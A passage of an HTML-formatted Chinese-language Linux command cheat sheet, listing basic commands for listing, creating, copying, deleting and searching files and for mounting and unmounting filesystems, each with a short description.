style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">pwd 显示工作路径</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls 查看目录中的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls -F 查看目录中的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls -l 显示文件和目录的详细资料</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls -a 显示隐藏文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls *[0-9]* 显示包含数字的文件名和目录名</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tree 显示文件和目录由根目录开始的树形结构(1)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">lstree 显示文件和目录由根目录开始的树形结构(2)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkdir dir1 创建一个叫做 'dir1' 的目录'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkdir dir1 dir2 同时创建两个目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkdir -p /tmp/dir1/dir2 创建一个目录树</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rm -f file1 删除一个叫做 'file1' 的文件'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rmdir dir1 删除一个叫做 'dir1' 的目录'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rm -rf dir1 删除一个叫做 'dir1' 的目录并同时删除其内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rm -rf dir1 dir2 同时删除两个目录及它们的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mv dir1 new_dir 重命名/移动 一个目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cp file1 file2 复制一个文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cp dir/* . 复制一个目录下的所有文件到当前工作目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cp -a /tmp/dir1 . 复制一个目录到当前工作目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cp -a dir1 dir2 复制一个目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ln -s file1 lnk1 创建一个指向文件或目录的软链接</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ln file1 lnk1 创建一个指向文件或目录的物理链接</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">file file1 outputs the mime type of the file as text</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">iconv -l 列出已知的编码</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding.</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find . -maxdepth 1 -name *.jpg -print -exec convert \"{}\" -resize 80x60 \"thumbs/{}\" ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文件搜索</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find / -name file1 从 '/' 开始进入根文件系统搜索文件和目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find / -user user1 搜索属于用户 'user1' 的文件和目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find /home/user1 -name *.bin 在目录 '/ home/user1' 中搜索带有'.bin' 结尾的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find / -name *.rpm -exec chmod 755 '{}' ; 搜索以 '.rpm' 结尾的文件并定义其权限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find / -xdev -name *.rpm 搜索以 '.rpm' 结尾的文件，忽略光驱、捷盘等可移动设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">locate *.ps 寻找以 '.ps' 结尾的文件 - 先运行 'updatedb' 命令</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">whereis halt 显示一个二进制文件、源码或man的位置</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">which halt 显示一个二进制文件或可执行文件的完整路径</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>挂载一个文件系统</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 '/ mnt/hda2' 已经存在</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 '/ mnt/hda2' 退出</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fuser -km /mnt/hda2 当设备繁忙时强制卸载</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount /dev/fd0 /mnt/floppy 挂载一个软盘</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, 